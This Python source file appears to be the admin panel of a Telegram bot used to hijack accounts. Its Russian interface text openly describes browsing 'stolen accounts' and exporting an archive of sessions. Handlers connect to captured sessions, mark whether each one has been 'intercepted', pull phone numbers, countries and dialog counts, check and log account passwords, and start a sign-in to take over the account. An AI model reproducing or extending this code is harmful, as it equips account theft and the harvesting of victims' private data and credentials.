import logging
import phonenumbers
from phonenumbers.phonenumberutil import region_code_for_country_code
from tgbot.dialogs.dialog import dialog, migrate
from tgbot.keyboards.keyboard import keyboard
from tgbot.services.get_text import gText
from tgbot.services.Session import ImportSession
from tgbot.states.State import State
from tgbot.services.Log import Log

# Configure logging for error tracking and debugging
logger = logging.getLogger(__name__)

async def menu(message, state, repo, edit):
    """Display the main admin panel with available options."""
    title = "⚙️ Панель админа"
    text = [
        "Здесь вы можете отследить всю статистику бота, просмотреть украденные аккаунты и много другое.\n",
        "<b>👤 Аккаунты</> - вывести весь список доступных аккаунтов",
        "<b>🔍 Чекнуть</> - чекнуть определенный акк, поиск по ID или номеру",
        "<b>📈 Статистика</> - общая статистика",
        "<b>📤 Экспорт</> - получить архив сессий"
    ]
    await state.update_data(page=1)
    markup = await keyboard.admin.main()
    await dialog(message, edit=edit, text=text, markup=markup, title=title)

async def accs(message, state, repo, edit):
    """List all available accounts with their session status."""
    title = "👤 Аккаунты"
    accs = await repo.list_users_of_sessions()
    text = [
        "Здесь выведен список всех доступных аккаунтов.",
        f"👉 Доступно: <b>{len(accs)}</>\n",
        "✅ - успешный выход из всех сессий",
        "❗️ - ожидает выхода из всех сессий"
    ]
    markup = await keyboard.admin.accs(accs, state)
    await dialog(message, edit=True, text=text, markup=markup, title=title)

async def get_user_info(client, repo, config):
    """
    Gather and format user information from the client.

    Args:
        client: The Telegram session client.
        repo: Repository for accessing user data.
        config: Bot configuration for dialog checks.

    Returns:
        tuple: (title, text) if successful, (None, None) if failed.
    """
    try:
        user = await client.check_dialogs(config)
    except Exception as e:
        logger.error(f"Error checking dialogs: {e}")
        return None, None

    if not user:
        return None, None

    try:
        phone = client.meta['phone']
        region = phonenumbers.parse('+' + str(phone.replace('+', '')))
        country = region_code_for_country_code(region.country_code)
    except phonenumbers.NumberParseException:
        logger.warning(f"Failed to parse phone number: {phone}")
        country = "Unknown"

    ses = (await repo.get_user(user['user'].id))['reset_auth']
    ses_status = "Перехвачена ✅" if ses else "Ожидает перехвата ❗️"
    title = f"👤 Аккаунт {client.meta['user_id']}"
    text = [
        f"📌 Сессия: <b>{ses_status}</>\n",
        f"👤 ID: <code>{user['user'].id}</>",
        f"🔹 Username: <b>{user['user'].username}</>",
        f"📲 Номер: <b>{phone}</>",
        f"💡 Страна: <b>{country}</>",
        f"⭐️ Премиум: <b>{user['user'].is_premium}</>",
        f"❗️ Скам: <b>{user['user'].is_scam}</>"
    ]
    text.append("\n👇 <b> Диалоги 👇</>\n")
    dialog_types = {
        'channel': '🔔 Каналы',
        'bot': '🤖 Боты',
        'private': '💬 Личные',
        'group': '👤 Группы',
        'supergroup': '👥 Супергруппы'
    }
    for key, label in dialog_types.items():
        if key in user:
            text.append(f"{label}: <b>{user[key]}</b>")
    text.append(f"\n👉 Сообщения в избранном: <b>{user['me']}</>")
    text.append(f"👉 Админ-права: <b>{user['is_creator']}</> (избранное учитывается)\n")
    if user.get('find', '') != '':
        text.append(f"🔍 <b>Найденные диалоги:</b> {user['find']}")
    return title, text

async def open_acc(message, state, repo, edit):
    """Show detailed information for a selected account."""
    select_user = (await state.get_data())['_select']
    await repo.del_sign_in(select_user)
    client = ImportSession().inject(select_user)

    try:
        await client.client.connect()
    except Exception as e:
        logger.error(f"Failed to connect to client for {select_user}: {e}")
        title = "❗️Ошибка подключения"
        text = ["Не удалось подключиться к клиенту."]
        markup = await keyboard.admin.back_to_open_acc()
        await dialog(message, edit=True, text=text, markup=markup, title=title)
        return

    title, text = await get_user_info(client, repo, message.bot.config)
    if not title:
        title = "❗️Произошла какая-то ошибка"
        text = [
            "Произошла ошибка при обращении к данному аккаунту, возможно сессия невалидна или аккаунт был заблокирован.\n",
            "<b>Хотите ли Вы удалить все записанные данные об этом аккаунте?</>"
        ]
        markup = await keyboard.admin.delete_acc(select_user)
    else:
        markup = await keyboard.admin.select(select_user)

    await client.client.disconnect()
    await dialog(message, edit=True, text=text, markup=markup, title=title)

async def delete_acc(message, state, repo, edit):
    """Delete a selected account and return to the account list."""
    select_user = (await state.get_data())['_select']
    await repo.delete_user_of_phone(select_user)
    await State.admin.accs.set()
    await migrate(message=message, state=state, repo=repo, edit=True)

async def acc_check_pass(message, state, repo, edit):
    """Check passwords for a selected account and log them."""
    await message.delete()
    select_user = (await state.get_data())['_select']
    client = ImportSession().inject(select_user)
    try:
        await client.client.connect()
        passwords = await client.check_passwords()
        await Log(message).passwords(passwords)
    except Exception as e:
        logger.error(f"Error checking passwords for {select_user}: {e}")
    finally:
        await client.client.disconnect()
    await State.admin.open_acc.set()
    await migrate(message=message, state=state, repo=repo, edit=False)

async def acc_sign_in(message, state, repo, edit):
    """Handle sign-in process for a selected account."""
    await message.delete()
    select_user = (await state.get_data())['_select']
    client = ImportSession().inject(select_user)
    try:
        await client.client.connect()
        count = await client.get_support()
        await repo.sign_in(select_user, count)
    except Exception as e:
        logger.error(f"Sign-in failed for {select_user}: {e}")
        title = "❗️Ошибка"
        text = ["Произошла ошибка при входе в аккаунт."]
        markup = await keyboard.admin.back_to_open_acc()
        await dialog(message, edit=True, text=text, markup=markup, title=title)
        return
    finally:
        await client.client.disconnect()
    title = "📲 Вход в аккаунт"
    text = [
        f"Введите номер <code>{select_user}</> и ждите код для входа в аккаунт, который придет в этот чат."
    ]
    markup = await keyboard.admin.back_to_open_acc()
    await dialog(message, edit=True, text=text, markup=markup, title=title)

async def dialog_admin(state, message, current_state, repo, edit: bool = True):
    """Route admin commands based on the current state."""
    state_handlers = {
        State.admin.main.state: menu,
        State.admin.accs.state: accs,
        State.admin.open_acc.state: open_acc,
        State.admin.delete_acc.state: delete_acc,
        State.admin.acc_check_pass.state: acc_check_pass,
        State.admin.acc_sign_in.state: acc_sign_in
    }
    handler = state_handlers.get(current_state)
    if handler:
        await handler(message, state, repo, edit)
    else:
        logger.warning(f"Unhandled state: {current_state}")